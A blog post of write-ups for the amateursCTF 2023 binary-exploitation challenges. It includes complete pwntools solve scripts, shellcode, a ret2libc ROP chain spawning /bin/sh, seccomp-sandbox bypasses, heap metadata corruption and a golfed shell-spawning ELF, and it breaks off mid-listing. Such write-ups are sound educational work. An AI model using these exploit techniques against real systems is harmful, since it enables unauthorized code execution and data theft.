---
title: "amateursCTF 2023 pwn writeups"
description: "Lessons in not overcomplicating things"
date: "2023-07-19"
banner:
  src: ""
  alt: ""
  caption: ''
categories:
  - "Security"
  - "Writeup"
keywords:
  - "Assembly"
  - "x86_64"
  - "Reverse Engineering"
  - "Binary Exploitation"
---

AmateursCTF was running this past week, and I figured I should poke around in it to learn some pwn, as I have been trying to learn new techniques both in terms of modern exploits and just workflow improvements. I wasn't trying to compete, but I spent a few hours the past few days knocking down most of the pwn category (ran out of time for the last 2, an x87 challenge and an os pwn challenge).

# Table of Contents

Challenges are ordered by number of solves. ELFCrafting-v2 had 29 solves. rntk had 186.
- [rntk](#rntk)
- [Permissions](#permissions)
- [Hex Converter](#hex-converter)
- [Hex Converter 2](#hex-converter-2)
- [Hex Converter 2 (The hard way)](#hex-converter-2-the-hard-way)
- [I Love FFI](#i-love-ffi)
- [ELFCrafting v1](#elfcrafting-v1)
- [Simple Heap v1](#simple-heap-v1)
- [Perfect Sandbox](#perfect-sandbox)
- [ELFCrafting v2](#elfcrafting-v2)

# rntk <a name="rntk"></a>
We get a challenge binary and no source. Let's open it in Binary Ninja. This is Binja's "High Level Instruction Language", so braces and casting is omitted, but casting can be understood by the shorthands such as `zx.q` being size-extend quad-word (cast to `uint64_t`)

```c
int main(){
    setbuf(fp: stdout, buf: nullptr)
    setbuf(fp: stderr, buf: nullptr)
    generate_canary()
    while (true)
        puts(str: "Please select one of the followi…")
        puts(str: "1) Generate random number")
        puts(str: "2) Try to guess a random number")
        puts(str: "3) Exit")
        int32_t var_c = 0
        __isoc99_scanf(format: &data_402138, &var_c)
        getchar()
        int32_t rax_2 = var_c
        if (rax_2 == 3)
            break
        if (rax_2 == 1)
            printf(format: &data_40213b, zx.q(rand()))
        else if (rax_2 == 2)
            random_guess()
    exit(status: 0)
}
```

`main` is mostly uninteresting, just managing the menu. We can either print a random number, or be asked to guess a random number. This program also has a custom-made stack canary, lets take a look:

```c
int generate_canary(){
    srand(time(nullptr));
    int64_t rax_1 = rand();
    global_canary = rax_1;
    return rax_1;
}
```
This is where `crand` functions are seeded, and we call `srand` with the current unix timestamp. This is dangerous, because we can easily infer the first generated number, as the unix timestamp only changes every second. The next function of interest is `random_guess()`:
```c
int random_guess(){
    printf("Enter in a number as your guess:…");
    uint32_t global_canary_1 = global_canary;
    void var_38;
    gets(&var_38);
    int32_t rax_2 = strtol(&var_38, nullptr, 0xa);
    if (global_canary_1 != global_canary)
    {
        puts("***** Stack Smashing Detected **…");
        exit(1);
        /* no return */
    }
    int64_t rax_5;
    if (rax_2 != rand())
    {
        rax_5 = puts("Better luck next time");
    }
    else
    {
        rax_5 = puts("Congrats you guessed correctly!");
    }
    return rax_5;
}
```
We have a trivial buffer overflow with `gets()`. The only thing now is we need to bypass the stack canary. There also just *happens* to be a win function located at `0x4012b6` and the binary has PIE disabled. So the strategy is the following:
- Simulate `srand()` on the timestamp when we start the program
- Generate the first number with `rand()`
- Buffer overflow with `gets()`, preserve the canary with the random number we generated, and replace the return address with the `win()` function.

We run into a small issue, however. Due to network delay, the timestamp from when I start my program and when remote starts the challenge may differ. To remedy this, we just generate a few random numbers on remote, and compare them to `srand()` seeded on the starting timestamp plus one or two more seconds. The final solve script:

```py
from pwn import *
from ctypes import CDLL
import time

exe = ELF('./chal')
# Load libc as a library to simulate C functions in python!
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

conn = remote('amt.rs', 31175)

numsDict = dict()
# Get the current time
tstamp = libc.time(0)

# Initialize a dictionary with a few random numbers from the timestamp, +1,+2, and +3
for i in range(4):
    libc.srand(tstamp+i)
    numsDict[i] = [libc.rand(), libc.rand(), libc.rand(), libc.rand()]
print(numsDict)
win = 0x004012b6
# Print out a few random numbers from remote
conn.recvuntil('Exit\n')
conn.sendline('1')
n1 = conn.recvline()
conn.recvuntil('Exit\n')
conn.sendline('1')
n2 = conn.recvline()
conn.recvuntil('Exit\n')
conn.sendline('1')
n3 = conn.recvline()
print(n1, n2, n3)
conn.sendline('2')
conn.recvuntil(': ')
# Compare to our numsDict and select which timestamp we're seeded on
x = input("ind > ")
canary = numsDict[int(x)][0]
# BOF to win
conn.sendline(b'A'*(44) + p32(canary) + b'A'*8 + p64(win))
conn.interactive()
```
Run and we get our flag! `amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}`

# Permissions <a name="permissions"></a>
We're given a challenge binary and source. Let's take a look:

```c
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/seccomp.h>
#include <seccomp.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>

void setup_seccomp () {
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_KILL);
    int ret = 0;
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
    ret |= seccomp_load(ctx);
    if (ret) {
        errx(1, "seccomp failed");
    }
}

int main () {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    alarm(6);

    int fd = open("flag.txt", O_RDONLY);
    if (0 > fd)
        errx(1, "failed to open flag.txt");

    char * flag = mmap(NULL, 0x1000, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (flag == MAP_FAILED)
        errx(1, "failed to mmap memory");

    if (0 > read(fd, flag, 0x1000))
        errx(1, "failed to read flag");

    close(fd);

    // make flag write-only
    if (0 > mprotect(flag, 0x1000, PROT_WRITE))
        errx(1, "failed to change mmap permissions");

    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (code == MAP_FAILED)
        errx(1, "failed to mmap shellcode buffer");

    printf("> ");
    if (0 > read(0, code, 0x100000))
        errx(1, "failed to read shellcode");

    setup_seccomp();

    ((void(*)(char *))code)(flag);
    exit(0);
}
```
If you haven't seen seccomp before, it's a way to make a jail/sandbox for the linux kernel. You define the rules of seccomp, then when you load it, the program is no longer allowed to make certain syscalls (e.g. open a file, mmap, run a program).

In this case, the program opens the flag, reads it to a mmap'd section, changes the memory protections to be write-only, then makes an executable section for us to write shellcode and executes it with the flag address as an argument. Here is the solve script:

```py
from pwn import *

exe = ELF("./chal_patched")

context.binary = exe
context.arch = "amd64"
context.os = "linux"

def conn():
    r = remote('amt.rs', 31174)
    return r


def main():
    r = conn()
    r.recvuntil("> ")
    code = """
    mov rsi, rdi
    mov rdi, 0x1
    mov rdx, 0x100
    mov rax, 0x1
    syscall ; write(1,flag,0x100)
    """
    r.sendline(asm(code))
    r.interactive()

if __name__ == "__main__":
    main()
```
On first glance, this might be confusing. `flag` was denoted as write-only memory! Well, in x86, and in fact most architectures, write permission implies read! There's so such thing as setting write-only memory. Even if you look at `vmmap` within `pwndbg`, it'll say that it's write-only, but you can read to it just fine. There was a recent [article from Microsoft](https://devblogs.microsoft.com/oldnewthing/20230306-00/?p=107902) that covers this!

Write-only memory doesn't make sense on modern processors these days, anyway. Processors have caches to prevent writing/reading directly from RAM/storage in memory regions that it uses often (because doing that is S L O W). Normally, the processor would load the memory it's going to modify into its cache, make the changes, then writeback to memory. To securely implement write-only memory, the processor would need to either write every byte it changes directly to memory without ever loading it (slow and kind of silly), or keep a mapping of what bytes it changed in each cache block, and write just those bytes (even more confusing and slow).

Oh yeah, the flag: `amateursCTF{exec_1mpl13s_r34d_8751fda0}`
# Hex Converter <a name="hex-converter"></a>
We get a binary and challenge source, let's take a look:

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int i = 0;

    char name[16];
    printf("input text to convert to hex: \n");
    gets(name);

    char flag[64];
    fgets(flag, 64, fopen("flag.txt", "r"));
    // TODO: PRINT FLAG for cool people ... but maybe later

    while (i < 16)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));
        i++;
    }
    printf("\n");
}
```
We have trivial overflow with `gets`, but `flag` is located "behind" name, so we can't write to it or cause printing with a null-byte omission... but we can overwrite `i`! The while loop says while `i < 16`, so we can just set `i` to a really low negative number, and read all the bytes prior to `name`, thus leaking the flag. `i` isn't casted to unsigned int, so negative indexing like this works. Here is the solve script:
```py
from pwn import *

r = remote('amt.rs', 31630)
# 16 bytes of name overflow, 12 padding, our index set to -256
r.sendline(b'A'*16+ b'B'*12+p32(0xFFFFFF00))
r.interactive()
```
Remote prints out a large hex string, we can decode it and recover the flag:
`amateursCTF{wait_this_wasnt_supposed_to_be_printed_76723}`

# Hex Converter 2 <a name="hex-converter-2"></a>
This makes a slight change to the hex printing:
```c
    // Same main as hex-conv-1
    while (1)
    {
        // the & 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe
        printf("%02X", (unsigned int)(name[i] & 0xFF));

        // exit out of the loop
        if (i <= 0)
        {
            printf("\n");
            return 0;
        }
        i--;
    }
```

Now, if index is above 0, it will print in reverse order, but once it equals or is below 0, it only prints the single byte its indexing and exits. This just means we have to leak the flag one byte at a time, with the following solve script:
```py
index = 0xFFFFFFFF
leak = []
for i in range (0x100):
    r = remote('amt.rs', 31631)
    r.recvuntil(': \n')
    r.sendline(b'A'*28 + p32(index-i))
    leak.append(r.recvline().decode().strip().replace('\n',''))
    print(leak)
    r.close()
print(''.join(leak))
```
We get the hex string out, and the flag should be in there, just in reverse.

### But I didn't solve it like this.
# Hex Converter 2 (The hard way) <a name="hex-converter-2-the-hard-way"></a>
My monkey brain figured that a revenge challenge like this would just patch the indexing, and just started immediately looking for a standard pwn exploit. Of course, it found one. Looking at the program in pwndbg, we find that `__libc_start_main+128` is on the stack, and we can set index to whatever number we wnat, and it'll print out bytes from the stack, so we can leak libc. From there, the binary is compiled without PIE, meaning we can return back to main and have another buffer overflow again. With the libc leak, we can return to a `pop rdi` gadget, place the address of `/bin/sh` on the stack, then `ret2system` calling `system('/bin/sh')`. 

I had an issue that returning to main, the next call to `printf` would segfault. This is due to a stack-alignment error, as some functions expect a 16-byte alignment. This just means we have to return to a `ret` gadget first before returning to main.

I tried it and it worked. It did not, however, work on remote. Which I found odd at first, until I realized that *this pwn challenge* was running debian bookworm-slim, instead of ubuntu 22.04. I had to build the docker, grab the libc, and oh wait, it's a debian libc, so I can't debug on my machine (blegh). So I had to build a docker file with gdb installed and test my exploit on main. In Debian, it's actually `__libc_start_main+133` and the offsets for `pop rdi`, `/bin/sh`, and `system` change.

The relevant Dockerfile:
```docker
FROM debian:bookworm-slim
COPY chal /home/ctf/chal
COPY flag.txt /srv/app/flag.txt

RUN apt-get update
RUN apt-get -y install gdb
RUN apt-get -y install git
RUN git clone https://github.com/pwndbg/pwndbg
RUN cd pwndbg && ./setup.sh
```
And the solve script:
```py
from pwn import *
r = remote('amt.rs', 31631)
r.recvuntil(': \n')
#16 bytes overflow name, 12 padding, set i=207
#this places the hex ouput to be the libc_start_main address to be first
# replace return address with `ret` from main, then ret to main() to restart
r.sendline(b'A'*16+ b'B'*12+p32(0xcf)+p64(0x1)+p64(0x40123a)+p64(0x401186))
# Decode hex output and get libc base leak
hexresp = r.recvline()
libcaddr = int(hexresp[0:16].decode(),16)
print("base:", hex(libcaddr-133-0x271c0))
libcbase = libcaddr-133-0x0271c0
r.recvuntil(': \n')
# Do the following ropchain:
# ret
# pop rdi
# &(/bin/sh)
# system
r.sendline(b'A'*16+ b'B'*12+p32(0x0)+b'\0'*8+p64(0x40123a)+p64(libcbase+0x27725)+p64(libcbase+0x196031)+p64(libcbase+0x4c330))
r.interactive()
```
I had issues with trying to use the debian libc cleanly, so I computed offsets manually using the [libc database website](https://libc.blukat.me/), a very useful tool.

We get a shell and see that the flag implied a much easier solution (oof): `amateursCTF{an0ther_e4sier_0ne_t0_offset_unvariant_while_l00p}`

# I Love FFI <a name="i-love-ffi"></a>
This gave us a rust library, source for that library, and chal source, and chal binary. Lets take a look:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <sys/mman.h>

struct MmapArgs {
    uint64_t * addr;
    uint64_t length;
    int protection;
    int flags;
    int fd;
    uint64_t offset;
};

extern struct MmapArgs mmap_args();

int main () {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    struct MmapArgs args = mmap_args();
    char * buf = mmap(args.addr, args.length, args.protection, MAP_PRIVATE | MAP_ANON, args.fd, args.offset);
    if (buf < 0) {
        perror("failed to mmap");
    }

    read(0, buf, 0x1000);

    printf("> ");
    int op;
    if (scanf("%d", &op) == 1) {
        switch (op) {
            case 0:
                ((void (*)(void))buf)();
                break;
            case 1:
                puts(buf);
                break;
        }
    }
}

```
`main` mmaps a region of memory, defined by `mmap_args()`, reads in some code, then we can either run our region of memory as code, or print it out. Running the program gives us 6 prompts before it reads in code, so let's take look at this `mmap_args()` function, which used the foriegn function interface in rust:

```rust
#![allow(warnings)]

pub struct MmapArgs {
    addr: u64,
    length: u64,
    protection: u32,
    flags: u32,
    fd: u32,
    offset: u64,
}

#[no_mangle]
pub extern "C" fn mmap_args() -> MmapArgs {
    let args = MmapArgs {
        addr: read::<u64>(),
        length: read::<u64>(),
        protection: read::<u32>(),
        flags: read::<u32>(),
        fd: read::<u32>(),
        offset: read::<u64>(),
    };

    if args.protection & 4 != 0 {
        panic!("PROT_EXEC not allowed");
    }

    args
}

fn read<T>() -> T
where
    T: std::str::FromStr,
    <T as std::str::FromStr>::Err: std::fmt::Debug,
{
    use std::io::{stdin, stdout, Write};
    print!("> ");
    stdout().flush().unwrap();
    let mut buf = String::new();
    stdin().read_line(&mut buf).unwrap();
    buf.trim().parse::<T>().unwrap()
}
```
Ok, so it reads in and attempts to parse each read call as an integer, either 32 or 64 bit, all unsigned. If the protection field has `PROT_EXEC` or `0b100` enabled, then it prevents creation of the struct.

The first thing to note is that the `flags` field is already preset and not even used in `main`. I tried a few parameters, and noticed one combination of inputs *should've* given me a valid mmap call, but didn't. To verify what was going on, i just passed 1-6, as values to the `mmap_args()` call, and looked at the stack. Sure enough, the values in the struct were *not* in that order, and when it was converted back to C, the offset field took the place of the protection field. So we can send the paremeters `0, 4096, 0, 0, 0, 7` and get the mmap call: `mmap(NULL, 4096, PROT_EXEC | PROT_READ | PROT_WRITE,...,0,0)` Because of `PROT_ANON`, the `fd` field is ignored completely. We can send standard shellcode and get the flag. 

Here's the final solve script:
```py
# pwntools padding omitted, context was set to amd64 and linux
r.recvuntil("> ")
r.sendline('0')
r.recvuntil("> ")
r.sendline('4096')
r.recvuntil("> ")
r.sendline('0')
r.recvuntil("> ")
r.sendline('0')
r.recvuntil("> ")
r.sendline('0')
r.recvuntil("> ")
r.sendline('7')
r.sendline(asm(shellcraft.amd64.linux.cat('flag.txt')))
r.recvuntil("> ")
r.sendline('0')
```

We get our flag printed: `amateursCTF{1_l0v3_struct_p4dding}`

# ELFCrafting v1 <a name="elfcrafting-vi"></a>
This gave us a challenge binary. Let's take a look in Binary Ninja:

```c
setbuf(fp: stdout, buf: nullptr)
setbuf(fp: stderr, buf: nullptr)
puts(str: "I'm sure you all enjoy doing she…")
puts(str: "But have you ever tried ELF golf…")
puts(str: "Have fun!")
int32_t fd = memfd_create("golf", 0)
if (fd s< 0)
    perror(s: "failed to execute fd = memfd_cre…")
    exit(status: 1)
    noreturn
void buf
int32_t rax_1 = read(fd: 0, buf: &buf, nbytes: 0x20)
if (rax_1 s< 0)
    perror(s: "failed to execute ok = read(0, b…")
    exit(status: 1)
    noreturn
printf(format: "read %d bytes from stdin\n", zx.q(rax_1))
int32_t rax_6 = write(fd, buf: &buf, nbytes: sx.q(rax_1))
if (rax_6 s< 0)
    perror(s: "failed to execute ok = write(fd,…")
    exit(status: 1)
    noreturn
printf(format: "wrote %d bytes to file\n", zx.q(rax_6))
if (fexecve(fd, argv, envp) s< 0)
    perror(s: "failed to execute fexecve(fd, ar…")
    exit(status: 1)
    noreturn
return 0
```

The program makes a memory file, reads in 32 bytes to the file, then attempts to execute it. If you look at the ELF file format, the necessary headers alone well exceed 32 bytes. Even the simplest shellcode will take anywhere from 8-16 bytes. Clearly, we cannot send an ELF and expect something to work.

Luckily, the man page for execve specifices interpreter scripts:
> `pathname` must be either a binary executable, or a script starting with a line of the form:
> 
> `#!interpreter [optional-arg]`

shebangs allow us to call a file with a specific intepreter. So that directly doing `./file` will call the proper program to run it. Pretty much anything can be put here, so we'll just use 'cat' as our interpreter:
```py
from pwn import *

r = remote('amt.rs', 31178)
r.recvuntil('!\n')
r.sendline("#!/bin/cat flag.txt")
r.interactive()
```
We print out our flag: `amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}`

# Simple Heap v1 <a name="simple-heap-v1"></a>
We get a challenge binary. Let's take a look in Binary Ninja:
```c
int main(){
    setbuf(fp: stdout, buf: nullptr)
    setbuf(fp: stderr, buf: nullptr)
    puts(str: "Welcome to the flag checker")
    int64_t var_28 = getchunk()
    puts(str: "I'll give you three chances to g…")
    char* rax_4 = getchunk()
    check(rax_4)
    puts(str: "I'll also let you change one cha…")
    printf(format: "index: ")
    int32_t var_2c
    __isoc99_scanf(format: &data_20d7, &var_2c)
    getchar()
    printf(format: "new character: ")
    char rax_9 = getchar()
    getchar()
    rax_4[sx.q(var_2c)] = rax_9
    check(rax_4)
    free(mem: rax_4)
    puts(str: "Last chance to guess my flag")
    check(getchunk())
    exit(status: 0)
}

int check(char* arg1) {
    char* buf = malloc(bytes: 0x80)
    int32_t fd = open(file: "flag.txt", oflag: 0)
    if (fd s< 0)
        errx(eval: 1, fmt: "failed to open flag.txt")
        noreturn
    read(fd, buf, nbytes: 0x80)
    close(fd)
    if (strcmp(arg1, buf) != 0)
        printf(format: "%s is not the flag.\n", arg1)
        return free(mem: buf)
    puts(str: "Correct!")
    exit(status: 7)
}

int getchunk(){
    printf(format: "size: ")
    uint64_t i
    __isoc99_scanf(format: &data_200f, &i)
    getchar()
    printf(format: "data: ")
    int64_t buf_1 = malloc(bytes: i)
    int64_t buf = buf_1
    while (i != 0)
        ssize_t rax_7 = read(fd: 0, buf, nbytes: i)
        i = i - rax_7
        buf = buf + rax_7
    return buf_1
}
```
We make a chunk to prevent libc leaks to `main_arena`, then a second chunk that checks against the flag, which loads in and gets freed if incorrect. We then get to modify one byte in our 2nd chunk, before it gets checked again. Finally, we get one more check with a brand new chunk.

The biggest red flag to me is that the index for modifying one character in our second chunk has no bounds check or casting, meaning we can pass a negative or unbounded index and write any byte. Before we change our byte, our memory structure looks like

```
chunk1 : size x
data
chunk2: size y
data
flagchunk: size 0x91, free in tcache
fd. data=flag (first 8 bytes missing)
```
`check` prints out the string that we wrote into our chunk when it fails. meaning if we can change the size of chunk2, and write over all the nullbytes to leak the flag, we can win. For simplicity, I made chunk2 128 bytes, which will be registered as `0x90` when malloced. Then, when I do my overwrite, I overwrite with 177 to forge a slightly larger block in place of chunk2. The check will happen again, and free chunk3 and chunk2. We now alloc chunk 3 with size 159 and fill it with 159 printable characters. Even though we forged the size of chunk 2, and it technically overlaps with the flagchunk, the pointer to the flagchunk is still in the tcache! This means that when it checks chunk3, it will load the complete flag into flagchunk, but we overwrite the metadata when we passed in data from `getchunk()`:
```
chunk1: size x
data
chunk2: size 0xb1
179 C's
flagchunk (inside): size 0x4343434343434343 (overwrriten with C's)
the flag
```

So our solution script is:
```py
# pwntools wrapper omitted.
r = conn()

### Init First Chunk
r.recvuntil("size: ")
r.sendline(b'128')
r.recvuntil("data: ")
r.sendline(b'A' * 128)

### Init Second Chunk
r.recvuntil("size: ")
r.sendline(b'128')
r.recvuntil("data: ")
r.sendline(b'B' * 128)
### Write to second Chunk, overwrite size
r.recvuntil("index: ")
r.sendline('-8')
r.recvuntil("new character: ")
r.sendline('\xb1')

### Init 3rd Chunk
r.recvuntil("size: ")
r.sendline(b'159')
r.recvuntil("data: ")
r.sendline(b'C' * 159)
r.interactive()
```

We run and leak the flag: `flag{wh0_kn3w_y0u_c0uld_unm4p_th3_libc}`... huh? I didn't unmap libc at all? Apparently, this was entirely unintended. Because of the arbitrary chunk size, you can apparently forge the size of the 2nd chunk and unmap a portion of libc, then write custom symbols to get a shell/leak flag. Oh well!
# Perfect Sandbox <a name="perfect-sandbox"></a>
This challenge gave us a binary and source. Let's take a look at the source:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <err.h>
#include <time.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <linux/seccomp.h>
#include <seccomp.h>

void setup_seccomp () {
    scmp_filter_ctx ctx;
    ctx = seccomp_init(SCMP_ACT_KILL);
    int ret = 0;
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
    ret |= seccomp_load(ctx);
    if (ret) {
        errx(1, "seccomp failed");
    }
}

int main () {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    char * tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);

    int urandom = open("/dev/urandom", O_RDONLY);
    if (urandom < 0) {
        errx(1, "open /dev/urandom failed");
    }
    read(urandom, tmp, 4);
    close(urandom);

    unsigned int offset = *(unsigned int *)tmp & ~0xFFF;
    uint64_t addr = 0x1337000ULL + (uint64_t)offset;

    char * flag = mmap((void *)addr, 4096, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (flag == MAP_FAILED) {
        errx(1, "mapping flag failed");
    }

    int fd = open("flag.txt", O_RDONLY);
    if (fd < 0) {
        errx(1, "open flag.txt failed");
    }
    read(fd, flag, 128);
    close(fd);

    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (code == MAP_FAILED) {
        errx(1, "mmap failed");
    }

    char * stack = mmap((void *)0x13371337000, 0x4000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE | MAP_GROWSDOWN, -1, 0);
    if (stack == MAP_FAILED) {
        errx(1, "failed to map stack");
    }

    printf("> ");
    read(0, code, 0x100000);

    setup_seccomp();

    asm volatile(
        ".intel_syntax noprefix\n"
        "mov rbx, 0x13371337\n"
        "mov rcx, rbx\n"
        "mov rdx, rbx\n"
        "mov rdi, rbx\n"
        "mov rsi, rbx\n"
        "mov rsp, 0x13371337000\n"
        "mov rbp, rbx\n"
        "mov r8,  rbx\n"
        "mov r9,  rbx\n"
        "mov r10, rbx\n"
        "mov r11, rbx\n"
        "mov r12, rbx\n"
        "mov r13, rbx\n"
        "mov r14, rbx\n"
        "mov r15, rbx\n"
        "jmp rax\n"
        ".att_syntax prefix\n"
        :
        : [code] "rax" (code)
        :
    );
}
```

There's a couple key points to notice here:

- The program loads the flag at a random offset page, this variable is stored on the stack.
- The program maps a region for our own code, located at `0x13371337000`
- The program reads our code, then enters a Strict Seccomp mode, meaning we can only call read, write, and exit.
- It then clobbers all of the main registers, but sets `rsp` to the start of a newly mapped stack region, and `rax` the location of our code, every other register is set to `0x13371337`

Running `checksec` on the challenge gives us a few important tools:
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```
Partial RELRO is enabled, meaning the Global offset table (GOT) is writable, additionally, PIE is disabled, meaning the program (as well as the addresses in the GOT) are always in the same place.

This challenge made me think for quite a bit, trying to see what I could do about the seccomp. I thought about trying to brute force the location of the flag mapping, but that would be near impossible, since if I missed where I was reading from, I would just segfault. 

Eventually, I realized that I could use the GOT and the write calls to leak the location of `libc`. For example, if I call `write(1, read, 8)`, I would leak the libc location stored for `read` in the GOT.

Ok... so I have a libc leak, but how do I get to the flag mmap? Obviously I can't pop a shell or call system, seccomp prevents any call to execve. Returning to main in any fashion was pretty much useless. It dawned on me that if I could get a leak to the original stack, I could find the stack location of `flag`, and write the memory from there to the console! Luckily, there's a symbol in `libc` that points to the original stack, `environ`. `environ` points to the start of `envp` when the program is executed, in otherwords, the environment variables on the stack. I did some debugging, and found that the flag address is exactly `41` quad words away from `environ`.

So our exploit needs to do the following:

- Leak libc by calling write/read on write/read, because GOT is static
- Load environ to leak the original stack address
- Subtract `41*8 = 0x148` from this stack address to get our flag address
- Load our flag address and write it to the console.
  
To simply things on my end, I did a two stage shellcode exploit, one which writes libc to the console, then does the environ+stack leak to get the flag.

```as
mov r15, rax ; our original code ptr is stored in rax, save it for later
mov rax, 0x1
mov rdi, rax
mov rsi, 0x404058
mov rdx, 0x10
syscall ; write(1, read, 16)
mov rax, 0x0
mov rdi, 0x0
mov rsi, r15
add rsi, 0x100
mov r15, rsi
mov rdx, 0x100
syscall ; read(0, code+0x100, 0x100)
jmp r15 ; *(code+0x100)()
nop
```
Followed by (this is a python format string):
```as
mov rdx, {hex(libc.symbols['environ'])} ; get the environ addr.
lea rax, [rdx] ; load the stack address
mov rbx, [rax] ; ptrs to ptrs
sub rbx, 0x148 ; subtract this address by 41 quad words
lea rax, [rbx]
mov rsi, [rax] ; load the flag address into rsi
mov rax, 0x1
mov rdi, 0x1
mov rdx, 0x100
syscall ; write(1, flag, 0x100)
nop
nop
```

The complete solve script:
```py
from pwn import *
r = remote('amt.rs', 31173)

context.arch = "amd64"
context.os = "linux"

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

r.recvuntil('> ')

print(libc.symbols['environ'])
code = """
mov r15, rax
mov rax, 0x1
mov rdi, rax
mov rsi, 0x404058
mov rdx, 0x10
syscall
mov rax, 0x0
mov rdi, 0x0
mov rsi, r15
add rsi, 0x100
mov r15, rsi
mov rdx, 0x100
syscall
jmp r15
nop
nop
"""
payload = asm(code)
r.sendline(payload)
x = r.recv(numb=0x10)
first  = x[0:8]
first = int.from_bytes(first, byteorder='little')
print("read@libc: ",hex(first))
libc_base = first - libc.symbols['read']
print("libc_base: ", hex(libc_base))
libc.address = libc_base
code2 = f"""
mov rdx, {hex(libc.symbols['environ'])}
lea rax, [rdx]
mov rbx, [rax]
sub rbx, 0x148
lea rax, [rbx]
mov rsi, [rax]
mov rax, 0x1
mov rdi, 0x1
mov rdx, 0x100
syscall
nop
nop
"""
r.sendline(asm(code2))
r.interactive()
```
We get our flag: `amateursCTF{3xc3pt10n_suppr3ss10n_ftw}`


# ELFCrafting v2 <a name="elfcrafting-v2"></a>
A "fixed" version of ELFCrafting V2. They now require that the sent file, is in fact, a ELF. We only have 79 bytes to work with, and conventual tools for compiling ELFs exceed well over that. The description notes that the smallest x64 ELF is 80 bytes. Looking up about the smallest possible ELF, I stumbled upon this [amazing article](https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html) about golfing (in terms of bytes) 32-bit ELF files. There's no indication that the remote server disables 32 bit executables, so we can probably start with building a 32 bit ELF. My process was to start with the most "valid" ELF and follow the article's optimizations until I was sub-79 bytes.

I grabbed x86 shellcode (21 bytes) from exploit-db, and started the framework for a basic ELF, by manually defining the header and compiling with `nasm`:

```as
  BITS 32
  
                org     0x08048000
  
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 1, 1, 1, 0         ;   e_ident
        times 8 db      0
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$                       ;   e_phoff
                dd      0                               ;   e_shoff
                dd      0                               ;   e_flags
                dw      ehdrsize                        ;   e_ehsize
                dw      phdrsize                        ;   e_phentsize
                dw      1                               ;   e_phnum
                dw      0                               ;   e_shentsize
                dw      0                               ;   e_shnum
                dw      0                               ;   e_shstrndx
  
  ehdrsize      equ     $ - ehdr
  
  phdr:                                                 ; Elf32_Phdr
                dd      1                               ;   p_type
                dd      0                               ;   p_offset
                dd      $$                              ;   p_vaddr
                dd      $$                              ;   p_paddr
                dd      filesize                        ;   p_filesz
                dd      filesize                        ;   p_memsz
                dd      5                               ;   p_flags
                dd      0x1000                          ;   p_align
  
  phdrsize      equ     $ - phdr
  
  _start:
    push   0xb
    pop    eax
    push   ebx
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx,esp
    int    0x80
  filesize      equ     $ - $$
```
Unfortunately, the tiny ELF article's shellcode just calls `exit(42)`... I needed to pop a shell. I did some searching around for other shellcodes on exploit-db, and one was 14 bytes, by using the address of an existing `'/bin/sh'` string. The final size of the 32-bit ELF was 45 bytes, so clearly if we go all the way we have some room for a data segment. Additionally, I didn't need to set registers to 0, this execution is starting from `_start`, all working registers can more or less be assumed to be set to 0.

This meant that our final shellcode can look like
```as
mov    ebx, msg
mov    al, 0xb
int    0x80
SECTION .data
    msg db "/bin/sh"
```

This shellcode is actually small enough to fit *entirely* within the magic bytes and padding of the ELF file! Using the first level of the program header overlap described in the article, we can get our final ELF to **71 bytes**!

```as
  BITS 32
  
                org     0x00200000
  
  ehdr:                                                 ; Elf32_Ehdr
                db      0x7F, "ELF", 1, 1, 1        ;   e_ident
_start:     mov    ebx, msg
            mov    al, 0xb
            int    0x80
                dw      2                               ;   e_type
                dw      3                               ;   e_machine
                dd      1                               ;   e_version
                dd      _start                          ;   e_entry
                dd      phdr - $$               ; e_phoff
  phdr:         dd      1                       ; e_shoff       ; p_type
                dd      0                       ; e_flags       ; p_offset
                dd      $$                      ; e_ehsize      ; p_vaddr
